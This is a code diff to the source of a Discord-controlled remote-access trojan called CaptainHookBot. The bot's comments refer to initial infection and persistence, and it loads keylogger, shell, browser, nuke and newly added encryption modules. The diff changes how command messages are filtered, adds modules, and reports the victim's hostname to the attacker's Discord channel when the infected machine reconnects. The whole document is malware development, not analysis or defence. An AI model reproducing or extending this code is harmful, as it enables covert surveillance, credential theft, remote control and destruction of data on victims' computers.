@@ -24,34 +24,38 @@ logger = logging.getLogger(__name__)
 class CaptainHookBot(commands.Bot):
     def __init__(self):
         intents = discord.Intents.all()
-        super().__init__(command_prefix=Config.COMMAND_PREFIX, intents=intents)
+        super().__init__(command_prefix=Config.COMMAND_PREFIX, intents=intents, help_command=None)
         self.session_channel = None
         self.offline_cache = OfflineCache()
         self.wraith = WraithEngine()
         self.is_connected = True
+        self.logger = logger
         
         # Developer TUI
         if Config.DEVELOPER_MODE:
             self.tui = DeveloperTUI(self)
             self.tui.start()
 
-        # Global command filter
-        @self.check
-        async def globally_block_other_channels(ctx):
-            # 1. Allow if TUI/LocalDev
-            if getattr(ctx.author, "name", "") == "LocalDev" or ctx.author == "LocalDev":
-                return True
+    async def on_message(self, message):
+        """Early filtering of messages to save resources/memory."""
+        # 1. Ignore bots
+        if message.author.bot:
+            return
             
-            # 2. Find or create session channel if not set
-            if not self.session_channel:
-                 await self.get_or_create_session_channel()
+        # 2. LocalDev check (TUI input)
+        if getattr(message.author, "name", "") == "LocalDev":
+            await self.process_commands(message)
+            return
 
-            # 3. Check channel match
-            if self.session_channel and ctx.channel.id == self.session_channel.id:
-                return True
-            
-            # Ignore if not in the right channel (silently)
-            return False
+        # 3. Channel matching
+        if not self.session_channel:
+             await self.get_or_create_session_channel()
+
+        if self.session_channel and message.channel.id != self.session_channel.id:
+            # Silently ignore messages from other channels
+            return
+
+        await self.process_commands(message)
 
     async def setup_hook(self):
         # 0. Wraith Melt (Initial Infection & Persistence)
@@ -72,7 +76,7 @@ class CaptainHookBot(commands.Bot):
             logger.error(f"Persistence installation failed: {e}")
 
         # 3. Load modules
-        modules = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"]
+        modules = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke", "help", "encryption"]
         for module in modules:
             try:
                 # Use absolute import path for stability
@@ -160,6 +164,12 @@ class CaptainHookBot(commands.Bot):
                 except Exception as e:
                     logger.error(f"Error creating channel: {e}")
                     return None
+            else:
+                # Existing channel found, send "Back Online" message
+                try:
+                    await channel.send(f"🔄 **Hook is Back Online** (`{socket.gethostname()}`)")
+                except Exception as e:
+                    logger.error(f"Error sending back online message: {e}")
 
             self.session_channel = channel
             return channel
